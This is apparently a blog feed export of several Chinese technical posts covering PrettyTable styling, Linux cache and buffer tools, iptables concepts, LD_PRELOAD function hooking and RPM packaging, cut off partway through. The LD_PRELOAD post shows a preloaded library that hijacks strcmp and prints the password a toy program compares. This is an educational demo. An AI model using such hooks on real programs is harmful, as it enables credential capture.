class="headerlink" title="3.4、控制表样式"></a>3.4、控制表样式</h3><h4 id="3-4-1、临时设置表样式："><a href="#3-4-1、临时设置表样式：" class="headerlink" title="3.4.1、临时设置表样式："></a>3.4.1、临时设置表样式：</h4><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 可在使用set_style之前使用get_string方法获取该表的样式：</span><br><span class="hljs-comment">#+ 除了MSWORD_FRIENDLY目前还有两种内置样式可用于表：</span><br><span class="hljs-comment">#+ DEFAULT - 默认外观，用于撤消您可能进行的任何样式更改；</span><br><span class="hljs-comment">#+ PLAIN_COLUMNS - 无边框样式，适用于柱状数据的命令行程序</span><br><span class="hljs-keyword">from</span> prettytable <span class="hljs-keyword">import</span> MSWORD_FRIENDLY<br>x.set_style(MSWORD_FRIENDLY) <br><span class="hljs-built_in">print</span>(x)<br></code></pre></td></tr></table></figure><p>手动更改表格样式：</p><ul><li><code>border</code>- 布尔选项（必须是<code>True</code>或<code>False</code>），是否在表格周围绘制边框；</li><li><code>header</code>- 布尔选项（必须是<code>True</code>或<code>False</code>），表格的第一行是否显示所有字段名称的标题；</li><li><code>header_style</code> - 控制标题中字段名称的大写，允许值如下，默认值为None：<ul><li><code>cap</code>：每个单词的首字母大写;</li><li><code>title</code>：标题大小写；</li><li><code>upper</code>：全部为大写；</li><li><code>lower</code>：全部为小写；</li><li><code>None</code>：不更改原始字段名称设置；</li></ul></li><li><code>hrules</code> - 控制行后水平规则的打印，可选值为<code>FRAME</code>，<code>ALL</code>，<code>NONE</code> ；这些是<code>prettytable</code>模块内定义的变量，因此请确保导入或使用<code>prettytable.FRAME</code>等：</li><li><code>vrules</code> - 控制列之间垂直规则的打印，可选值为：<code>FRAME</code>，<code>ALL</code>，<code>NONE</code>；</li><li><code>align</code> - 水平对齐，可选值为：空，<code>l</code>（左），<code>c</code>（中），<code>r</code>（右）；</li><li><code>valign</code> - 垂直对齐，可选至为：空，<code>t</code>（顶部），<code>m</code>（中间），<code>b</code>（底部）；</li><li><code>int_format</code> - 控制整数数据的格式，为一个字符串，为“％”和“d”之间<code>print &quot;%d&quot; % 42</code>；</li><li><code>float_format</code> - 控制浮点数据的格式，为一个字符串，为“％”和“f”之间<code>print &quot;%f&quot; % 4.2</code>；</li><li><code>padding_width</code> - 列数据两侧的空格数（仅在左右填充为None时使用）；</li><li><code>left_padding_width</code> - 列数据左侧的空格数；</li><li><code>right_padding_width</code> - 列数据右侧的空格数；</li><li><code>vertical_char</code> - 用于绘制垂直线的单个字符，默认是<code>|</code>；</li><li><code>horizontal_char</code> - 用于绘制水平线的单个字符，默认是<code>-</code>；</li><li><code>junction_char</code> - 用于绘制线结的单个字符，默认是<code>+</code>；</li></ul><h4 id="3-4-2、长期设置样式："><a href="#3-4-2、长期设置样式：" class="headerlink" title="3.4.2、长期设置样式："></a>3.4.2、长期设置样式：</h4><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 更改相应的属性即可为“长期”设置选项</span><br>x.border = <span class="hljs-literal">False</span><br><span class="hljs-built_in">print</span>(x)<br></code></pre></td></tr></table></figure><p>如果您在创建表时知道所需的样式选项，则可以使用构造函数的关键字参数指定它们，更改相应的属性即可为“长期”设置选项；例如，以下两个代码块是等效的：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 代码块一</span><br>x = PrettyTable()<br>x.border = <span class="hljs-literal">False</span><br>x.header = <span class="hljs-literal">False</span><br>x.padding_width = <span class="hljs-number">5</span><br><br><span class="hljs-comment"># 代码块二</span><br>x = PrettyTable(border=<span class="hljs-literal">False</span>, header=<span class="hljs-literal">False</span>, padding_width=<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><h4 id="3-4-3、列设置"><a href="#3-4-3、列设置" class="headerlink" title="3.4.3、列设置"></a>3.4.3、列设置</h4><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 使用属性赋值而非关键字参数设置某些设置，可以按列控制某些设置，设置列对齐方式如下：</span><br><span class="hljs-built_in">print</span>(x.get_string(align=<span class="hljs-string">&quot;l&quot;</span>))<br><br><span class="hljs-comment"># 或者</span><br>x.align = <span class="hljs-string">&quot;l&quot;</span><br><br><span class="hljs-comment"># 将对齐设置为所有列的左侧，但您可以像这样设置各列的对齐方式</span><br>x.align[<span class="hljs-string">&quot;City name&quot;</span>] = <span class="hljs-string">&quot;l&quot;</span><br>x.align[<span class="hljs-string">&quot;Population&quot;</span>] = <span class="hljs-string">&quot;c&quot;</span><br>x.align[<span class="hljs-string">&quot;Area&quot;</span>] = <span class="hljs-string">&quot;r&quot;</span><br><br><span class="hljs-comment"># 下面的将覆盖上面的列设置，再次将所有列设置为“l”</span><br>x.align = <span class="hljs-string">&quot;l&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PrettyTable </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下的Cache/Buffer</title>
      <link href="/2019/01/01/cache-and-buffer/"/>
      <url>/2019/01/01/cache-and-buffer/</url>
      
        <content type="html"><![CDATA[<p>经常在使用 Linux 的时候会发现有一些内存经常被 Cache 和 Buffer 占用，而关于这两者之间的关系与区别却不了解，这篇文章主要就是介绍一下两者的区别与相关的运维手段。</p><h2 id="一、含义"><a href="#一、含义" class="headerlink" title="一、含义"></a>一、含义</h2><ul><li><p>Cache（缓存）：指 CPU 和内存之间高速缓存，为了调高CPU和内存之间数据交换而设计，用来给文件做缓存（相关的是PageCache），主要是针对读操作设计的；</p></li><li><p>Buffer（缓冲）：指在写入磁盘前的存储在内存中的内容，为了提高内存和硬盘（或其他I&#x2F;O设备的数据交换而设计），主要是针对写操作设计的；</p></li></ul><p><img src="/assets/images/cache-buffer-1.png" alt="Cache&#x2F;Buffer所处位置图解" loading="lazy"></p><p>下面为Linux下free指令显示的信息，以下简单描述一下各选项的含义：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@* ~]# free -g<br>              total        used        free      shared  buff/cache   available<br>Mem:            125           2         109           1          13         120<br>Swap:             7           0           7<br></code></pre></td></tr></table></figure><ul><li><strong>Mem</strong>：表示物理内存的统计信息；</li><li><strong>Swap</strong>：表示磁盘上交换分区的使用情况；</li><li>total：总的内存大小；</li><li>used：已经使用的内存大小（包含buff&#x2F;cache和shared的大小）；</li><li>free：空闲的内存大小；</li><li>shared：进程间的内存大小；</li><li>buff：写磁盘的数据在内存中缓存的数据大小，能够快速响应，后续会将数据定期刷到磁盘上；</li><li>cache：读取的数据在内存中缓存的数据大小，下次读取时能够快速返回；</li><li>available：真正可用的内存大小；</li></ul><h2 id="二、缓存相关脚本"><a href="#二、缓存相关脚本" class="headerlink" title="二、缓存相关脚本"></a>二、缓存相关脚本</h2><h3 id="2-1、缓存清理方式"><a href="#2-1、缓存清理方式" class="headerlink" title="2.1、缓存清理方式"></a>2.1、缓存清理方式</h3><ul><li><p>清理<code>pagecache</code>（页面缓存）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/vm/drop_caches <span class="hljs-comment"># sysctl -w vm.drop_caches=1</span><br></code></pre></td></tr></table></figure></li><li><p>清理<code>dentries</code>（目录的数据结构）和<code>inodes</code>（文件的数据结构）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> 2 &gt; /proc/sys/vm/drop_caches <span class="hljs-comment"># sysctl -w vm.drop_caches=2</span><br></code></pre></td></tr></table></figure></li><li><p>清理<code>pagecache</code>（页面缓存）、<code>dentries</code>（目录的数据结构）和<code>inodes</code>（文件的数据结构）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> 3 &gt; /proc/sys/vm/drop_caches <span class="hljs-comment"># sysctl -w vm.drop_caches=3</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="2-2、缓存使用分析"><a href="#2-2、缓存使用分析" class="headerlink" title="2.2、缓存使用分析"></a>2.2、缓存使用分析</h3><h4 id="2-2-1、slabtop指令"><a href="#2-2-1、slabtop指令" class="headerlink" title="2.2.1、slabtop指令"></a>2.2.1、slabtop指令</h4><p>内核的模块在分配资源的时候，为了提高效率和资源的利用率，都是透过<code>slab</code>来分配的。通过<code>slab</code>的信息，再配合源码能粗粗了解系统的运行情况，比如说什么资源有没有不正常的多，或者什么资源有没有泄漏。Linux系统透过<code>/proc/slabinfo</code>来向用户暴露slab的使用情况。</p><p>Linux所使用的 slab 分配器的基础是<code>Jeff Bonwick</code> 为 <code>SunOS</code> 操作系统首次引入的一种算法。Jeff 的分配器是围绕对象缓存进行的。在内核中，会为有限的对象集（例如文件描述符和其他常见结构）分配大量内存。Jeff 发现对内核中普通对象进行初始化所需的时间超过了对其进行分配和释放所需的时间。因此他的结论是不应该将内存释放回一个全局的内存池，而是将内存保持为针对特定目而初始化的状态。<code>Linux slab 分配器</code>使用了这种思想和其他一些思想来构建一个在空间和时间上都具有高效性的内存分配器。</p><p>使用<code>slabtop</code>命令可以实时的显示内核中<code>slab缓冲区</code>的细节信息，相关选项参数为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">--delay=n, -d n：每n秒更新一次显示的信息，默认是每3秒；<br>--<span class="hljs-built_in">sort</span>=S, -s S：指定排序标准进行排序（排序标准，参照man手册）；<br>--once, -o：显示一次后退出；<br>--version, -V：显示版本；<br>--<span class="hljs-built_in">help</span>：显示帮助信息。<br></code></pre></td></tr></table></figure><p><img src="/assets/images/cache-buffer-2.png" alt="slabtop运行状态示意图" loading="lazy"></p><h4 id="2-2-2、使用fincore-C-或pcstat-Go-分析程序的cache的占用"><a href="#2-2-2、使用fincore-C-或pcstat-Go-分析程序的cache的占用" class="headerlink" title="2.2.2、使用fincore(C)或pcstat(Go)分析程序的cache的占用"></a>2.2.2、使用fincore(C)或pcstat(Go)分析程序的cache的占用</h4><p><code>fincore</code>是<code>linux-ftools</code>工具集中的一个工具，其他的工具还有<code>fallocate</code>和<code>fadvise</code>，<code>linux-ftools</code>项目原来在<code>Google Code</code>上进行维护，但是<code>Google Code</code>已经在2016年就停止维护了，不过依旧可以在Github上寻找到该项目，目前我也将该项目迁移到了我自己的Github主页上，并做了一些简单的变动，项目地址为：<a href="https://github.com/bugwz/linux-ftools">bugwz&#x2F;linux-ftools</a>，fincore的编译安装在项目中有详细介绍。</p><p><a href="https://github.com/tobert/pcstat">pcstat</a>工具实现了与<code>fincore</code>相同的功能，并且输出效果看起来更为优雅，不过目前这里只演示<code>fincore</code>的工具使用。</p><p><code>fincore</code>工具运行如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@*-self linux-ftools]# ./fincore<br>fincore version 1.0.0<br>fincore [options] files...<br><br>  --pages=<span class="hljs-literal">false</span>      Don<span class="hljs-string">&#x27;t print pages</span><br><span class="hljs-string">  --summarize        When comparing multiple files, print a summary report</span><br><span class="hljs-string">  --only-cached      Only print stats for files that are actually in cache.</span><br></code></pre></td></tr></table></figure><p>使用<code>fincore</code>工具配合<a href="https://blog.51cto.com/shanker">Shanker</a>提供的脚本，即可简单的查看<code>cache</code>的占用情况，相关脚本如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment">#Author: Shanker</span><br><span class="hljs-comment">#Time: 2016/06/08</span><br><span class="hljs-comment">#set -e</span><br><span class="hljs-comment">#set -u</span><br><span class="hljs-comment">#you have to install fincore</span><br><span class="hljs-keyword">if</span> [ ! -f /usr/local/bin/fincore ]<br><span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;You haven&#x27;t installed fincore yet&quot;</span><br>    <span class="hljs-built_in">exit</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-comment">#find the top 10 processs&#x27; cache file</span><br>ps -e -o pid,rss | <span class="hljs-built_in">sort</span> -nk2 -r | <span class="hljs-built_in">head</span> -10 | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; /tmp/cache.pids<br><span class="hljs-comment">#find all the processs&#x27; cache file</span><br><span class="hljs-comment">#ps -e -o pid &gt; /tmp/cache.pids</span><br><span class="hljs-keyword">if</span> [ -f /tmp/cache.files ]<br><span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;The cache.files is exist, removing now &quot;</span><br>    <span class="hljs-built_in">rm</span> -f /tmp/cache.files<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line<br><span class="hljs-keyword">do</span><br>    lsof -p <span class="hljs-variable">$line</span> 2&gt;/dev/null | awk <span class="hljs-string">&#x27;&#123;print $9&#125;&#x27;</span> &gt;&gt; /tmp/cache.files <br><span class="hljs-keyword">done</span> &lt; /tmp/cache.pids<br><span class="hljs-keyword">if</span> [ -f /tmp/cache.fincore ]<br><span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;The cache.fincore is exist, removing now&quot;</span><br>    <span class="hljs-built_in">rm</span> -f /tmp/cache.fincore<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">cat</span> /tmp/cache.files`<br><span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> [ -f <span class="hljs-variable">$i</span> ]<br>    <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span> &gt;&gt; /tmp/cache.fincore<br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br>fincore -s  `<span class="hljs-built_in">cat</span> /tmp/cache.fincore`<br><span class="hljs-built_in">rm</span> -f /tmp/cache.&#123;pids,files,fincore&#125;<br></code></pre></td></tr></table></figure><p>执行脚本的结果如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">     Name         Size(bytes)   TotalPages  CachedPages   CachedSizes     CachedPercent<br>/data/check1.sh       40             1          1             4096           100.00%<br>/data/check2.sh       40             1          1             4096           100.00%<br>/data/check3.sh       40             1          1             4096           100.00%<br>/data/check4.sh       40             1          1             4096           100.00%<br>/data/check5.sh       40             1          1             4096           100.00%<br>/data/check6.sh       40             1          1             4096           100.00%<br>/data/check7.sh       40             1          1             4096           100.00%<br>/data/check8.sh       40             1          1             4096           100.00%<br>/data/check9.sh       40             1          1             4096           100.00%<br>/data/check10.sh      40             1          1             4096           100.00%<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 内存 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netfilter的数据包过滤器iptables</title>
      <link href="/2019/01/01/iptables/"/>
      <url>/2019/01/01/iptables/</url>
      
        <content type="html"><![CDATA[<h2 id="一、iptables简介"><a href="#一、iptables简介" class="headerlink" title="一、iptables简介"></a>一、iptables简介</h2><p>iptables是一款基于Netfilter的Linux防火墙的管理工具，可实现完成封包过滤、封包重定向和网络地址转换（NAT）等功能。</p><h2 id="二、iptables的基本概念"><a href="#二、iptables的基本概念" class="headerlink" title="二、iptables的基本概念"></a>二、iptables的基本概念</h2><h3 id="2-1、iptables的规则表"><a href="#2-1、iptables的规则表" class="headerlink" title="2.1、iptables的规则表"></a>2.1、iptables的规则表</h3><ul><li><code>表（tables）</code>：提供特定的功能，iptables内置了4个表，即filter表、nat表、mangle表和raw表，分别用于实现包过滤，网络地址转换、包重构(修改)和数据跟踪处理；</li><li><code>链（chains）</code>：数据包传播的路径，每一条链其实就是众多规则中的一个检查清单，每一条链中可以有一条或数条规则；</li><li><code>规则（rules）</code>：当一个数据包到达一个链时，iptables就会从链中第一条规则开始检查，看该数据包是否满足规则所定义的条件，如果满足规则，系统就会根据该条规则所定义的方法处理该数据包，如果不满足规则，继续检查下一条规则，如果该数据包不符合链中任一条规则，iptables就会根据该链预先定义的默认策略来处理数据包；</li></ul><h3 id="2-2、iptables的规则链"><a href="#2-2、iptables的规则链" class="headerlink" title="2.2、iptables的规则链"></a>2.2、iptables的规则链</h3><ul><li><code>PREROUTING链</code>：数据进入网卡，首先会进入<code>PREROUTING链</code>，内核依据数据包的目的IP判断是否需要传送出去；</li><li><code>FORWARD链</code>：数据包需要转发，并且内核允许转发，则该数据包经过该链，进入<code>POSTROUTING链</code>；</li><li><code>INPUT链</code>：数据包目的为本机，进入<code>INPUT链</code>，本机的所有进程均可访问到该数据包；</li><li><code>OUTPUT链</code>：本机的进程发送数据包至<code>OUTPUT链</code>；</li><li><code>POSTROUTING链</code>：数据包经过该链；</li></ul><h3 id="2-3、iptables的规则表与规则链的关系"><a href="#2-3、iptables的规则表与规则链的关系" class="headerlink" title="2.3、iptables的规则表与规则链的关系"></a>2.3、iptables的规则表与规则链的关系</h3><p><img src="/assets/images/iptables-1.png" alt="iptables中的数据包路线" loading="lazy"></p><h4 id="2-3-1、规则表过滤数据包的优先顺序及介绍："><a href="#2-3-1、规则表过滤数据包的优先顺序及介绍：" class="headerlink" title="2.3.1、规则表过滤数据包的优先顺序及介绍："></a>2.3.1、规则表过滤数据包的优先顺序及介绍：</h4><p>在<code>REHL4</code>中是三张表五个链，在<code>REHL5</code>成了四张表五个链。</p><ul><li><p><code>Raw表</code>：</p><ul><li><code>链</code>：OUTPUT、PREROUTING；</li><li><code>作用</code>：决定数据包是否被状态跟踪机制处理；</li><li><code>内核模块</code>：iptable_raw；</li></ul></li><li><p><code>Mangle表</code>：</p><ul><li><code>链</code>：PREROUTING、POSTROUTING、INPUT、OUTPUT、FORWARD；</li><li><code>作用</code>：修改数据包的服务类型、TTL、并且可以配置路由实现QOS；</li><li><code>内核模块</code>：iptable_mangle；</li></ul></li><li><p><code>Nat表</code>：</p><ul><li><code>链</code>：PREROUTING、POSTROUTING、OUTPUT；</li><li><code>作用</code>：用于网络地址转换（IP、端口）；</li><li><code>内核模块</code>：iptable_nat；</li></ul></li><li><p><code>Filter表</code>：</p><ul><li><code>链</code>：INPUT、FORWARD、OUTPUT；</li><li><code>作用</code>：主要用于过滤数据包；</li><li><code>内核模块</code>：iptables_filter；</li></ul></li></ul><h4 id="2-3-2、规则链之间的优先顺序（分三种情况）："><a href="#2-3-2、规则链之间的优先顺序（分三种情况）：" class="headerlink" title="2.3.2、规则链之间的优先顺序（分三种情况）："></a>2.3.2、规则链之间的优先顺序（分三种情况）：</h4><ul><li><code>第一种情况：入站数据流向</code><ul><li><code>PREROUTING链</code>：从外界到达防火墙的数据包，先被PREROUTING规则链处理（是否修改数据包地址等）；</li><li><code>INPUT链</code>：数据包目标为本地，内核将其传给INPUT链进行处理（是否允许通过等），通过以后再交给系统上层的应用程序进行响应；</li></ul></li><li><code>第二种情况：转发数据流向</code><ul><li><code>PREROUTING链</code>：从外界到达防火墙的数据包，先被PREROUTING规则链处理（是否修改数据包地址等）；</li><li><code>FORWARD链</code>：数据包目标为其他外部地址，内核将其传递给FORWARD链进行处理（是否转发或拦截）；</li><li><code>POSTROUTING链</code>：之后交给POSTROUTING规则链（是否修改数据包的地址等）进行处理；</li></ul></li><li><code>第三种情况：出站数据流向</code><ul><li><code>OUTPUT链</code>：防火墙本机向外部地址发送的数据包，首先被OUTPUT规则链处理，之后进行路由选择；</li><li><code>POSTROUTING链</code>：路由选择后传递给POSTROUTING规则链（是否修改数据包的地址等）进行处理；</li></ul></li></ul><h2 id="三、iptables的使用"><a href="#三、iptables的使用" class="headerlink" title="三、iptables的使用"></a>三、iptables的使用</h2>]]></content>
      
      
      
        <tags>
            
            <tag> iptables </tag>
            
            <tag> Netfilter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>共享库LD_PRELOAD环境变量分析</title>
      <link href="/2019/01/01/ld-preload/"/>
      <url>/2019/01/01/ld-preload/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>LD_PRELOAD</code>是<code>Linux/Unix</code>系统的一个环境变量，它影响程序的运行时的链接（Runtime linker），它允许在程序运行前定义优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p><p><strong>动态库的搜索路径搜索的先后顺序是：</strong></p><ul><li>编译目标代码时指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）；</li><li>环境变量<code>LD_LIBRARY_PATH</code>指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）；</li><li>配置文件<code>/etc/ld.so.conf</code>中指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）；</li><li>默认的动态库搜索路径<code>/lib</code>；</li><li>默认的动态库搜索路径<code>/usr/lib</code>；</li></ul><h2 id="二、模拟实现"><a href="#二、模拟实现" class="headerlink" title="二、模拟实现"></a>二、模拟实现</h2><p>这里并不是直接替换系统中的函数调用，而是采用添加hook的方式进行；</p><ul><li>main.c</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;test&quot;</span>)) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Incorrect password\n&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Correct password\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>用于劫持函数的<code>.so</code>代码<code>hook.c</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dlfcn.h&gt;</span></span><br><br><span class="hljs-comment">/* hook的目标是strcmp，所以typedef了一个STRCMP函数指针，</span><br><span class="hljs-comment"> * hook的目的是要控制函数行为，从原库libc.so.6中拿到strcmp指针，保存成old_strcmp以备调用. */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">int</span><span class="hljs-params">(*STRCMP)</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>*, <span class="hljs-type">const</span> <span class="hljs-type">char</span>*)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">strcmp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s2)</span> &#123;<br>  <span class="hljs-type">static</span> <span class="hljs-type">void</span> *handle = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-type">static</span> STRCMP old_strcmp = <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-keyword">if</span>(!handle) &#123;<br>    handle = dlopen(<span class="hljs-string">&quot;libc.so.6&quot;</span>, RTLD_LAZY);<br>    old_strcmp = (STRCMP)dlsym(handle, <span class="hljs-string">&quot;strcmp&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;oops!!! hack function invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;\n&quot;</span>, s1, s2);<br>  <span class="hljs-keyword">return</span> old_strcmp(s1, s2);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>编译运行：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 编译</span><br>gcc -o main main.c<br>gcc -fPIC -shared -o hook.so hook.c -ldl<br><br><span class="hljs-comment"># 运行</span><br>LD_PRELOAD=./hook.so ./main 123<br></code></pre></td></tr></table></figure><ul><li>运行结果：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">oops!!! hack <span class="hljs-keyword">function</span> invoked. s1=&lt;123&gt; s2=&lt;<span class="hljs-built_in">test</span>&gt;<br>Incorrect password<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RPM打包记录</title>
      <link href="/2019/01/01/make-rpm/"/>
      <url>/2019/01/01/make-rpm/</url>
      
        <content type="html"><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>RPM（Redhat Package Manager）是一个开放的软件包管理系统，用于Redhat、CentOS、Fedora等Linux 分发版的常见的软件包管理器。因为它允许分发已编译的软件，所以用户只用一个命令就可以安装软件。</p><p>RPM拥有功能强大的查询选项。我们可以搜索数据库来查询软件包或文件。RPM软件包中的文件是以压缩格式存放的，拥有一个定制的二进制头文件，其中包含有关包和内容的信息，可以让我们对单个软件包的查询简便又快速。</p><p>RPM另一个强大的功能是进行软件包的验证。如果我们担心误删了某个软件包中的某个文件，我们就可以对它进行验证。任何非正常现象将会被通知。如果需要的话还可以重新安装该软件包。在重新安装过程中，所有被修改过的配置文件将被保留。</p><p>RPM设计目标之一就是要保持软件包的原始特征， 就象该软件的原始发布者发布软件时那样。通过使用RPM我们可以拥有最初的软件和最新的补丁程序，还有详细的软件构建信息。</p><p>概括的说：RPM有五种基本的操作功能(不包括创建软件包)：安装、卸载、升级、查询、和验证。</p><h1 id="二、打包基础"><a href="#二、打包基础" class="headerlink" title="二、打包基础"></a>二、打包基础</h1><h2 id="2-1-打包环境"><a href="#2-1-打包环境" class="headerlink" title="2.1 打包环境"></a>2.1 打包环境</h2><p>本文使用CentOS作为rpm打包的打包环境，同时安装一些打包必备的软件，针对不同软件的构建过程，我们还需要其他的编译打包工具，比如C&#x2F;C++的make与gcc，Python的setuptools等，我们根据具体需求进行安装即可；</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装依赖软件包</span><br>yum -y install gcc gcc-c++ autoconf automake zlib-devel openssl-devel pcre-devel<br><span class="hljs-comment"># 安装rpm-build打包工具</span><br>yum -y install rpm-build<br><span class="hljs-comment"># 创建rpm打包环境依赖目录</span><br><span class="hljs-built_in">mkdir</span> -p ~/rpmbuild/&#123;BUILD,RPMS,S&#123;OURCES,PECS,RPMS&#125;&#125;<br><span class="hljs-comment"># 声明rpm build环境根目录</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;%_topdir %(echo <span class="hljs-variable">$HOME</span>)/rpmbuild&quot;</span> &gt; ~/.rpmmacros<br></code></pre></td></tr></table></figure><h2 id="2-2-软件包描述文件-SPEC"><a href="#2-2-软件包描述文件-SPEC" class="headerlink" title="2.2 软件包描述文件(SPEC)"></a>2.2 软件包描述文件(SPEC)</h2><p>制作一个rpm软件包就必须写一个软件包描述文件（SPEC），这个文件中包含了软件包的诸多信息，如软件包的名字、版本、类别、说明摘要、创建时要执行什么指令、安装时要执行什么操作、以及软件包所要包含的文件列表等等。</p><h3 id="2-2-1-文件头"><a href="#2-2-1-文件头" class="headerlink" title="2.2.1 文件头"></a>2.2.1 文件头</h3><p>一般的spec文件头包含以下几个域：</p><ul><li><p>Summary：用一句话概括该软件包尽量多的信息；</p></li><li><p>Name：软件包的名字，最终RPM软件包是用该名字与版本号，释出号及体系号来命名软件包；</p></li><li><p>Version：软件版本号。仅当软件包比以前有较大改变时才增加版本号；</p></li><li><p>Release：软件包释出号。一般我们对该软件包做了一些小的补丁的时候就应该把释出号加1；</p></li><li><p>Vendor：软件开发者的名字；</p></li><li><p>Copyright：软件包所采用的版权规则。具体有：GPL（自由软件），BSD，MIT，Public Domain（公共域），Distributable（贡献），commercial（商业），Share（共享）等，一般的开发都写GPL；</p></li><li><p>Group： 软件包所属类别，具体类别有：</p><ul><li>Amusements&#x2F;Games （娱乐&#x2F;游戏）</li><li>Amusements&#x2F;Graphics（娱乐&#x2F;图形）</li><li>Applications&#x2F;Archiving （应用&#x2F;文档）</li><li>Applications&#x2F;Communications（应用&#x2F;通讯）</li><li>Applications&#x2F;Databases （应用&#x2F;数据库）</li><li>Applications&#x2F;Editors （应用&#x2F;编辑器）</li><li>Applications&#x2F;Emulators （应用&#x2F;仿真器）</li><li>Applications&#x2F;Engineering （应用&#x2F;工程）</li><li>Applications&#x2F;File （应用&#x2F;文件）</li><li>Applications&#x2F;Internet （应用&#x2F;因特网）</li><li>Applications&#x2F;Multimedia（应用&#x2F;多媒体）</li><li>Applications&#x2F;Productivity （应用&#x2F;产品）</li><li>Applications&#x2F;Publishing（应用&#x2F;印刷）</li><li>Applications&#x2F;System（应用&#x2F;系统）</li><li>Applications&#x2F;Text （应用&#x2F;文本）</li><li>Development&#x2F;Debuggers （开发&#x2F;调试器）</li><li>Development&#x2F;Languages （开发&#x2F;语言）</li><li>Development&#x2F;Libraries 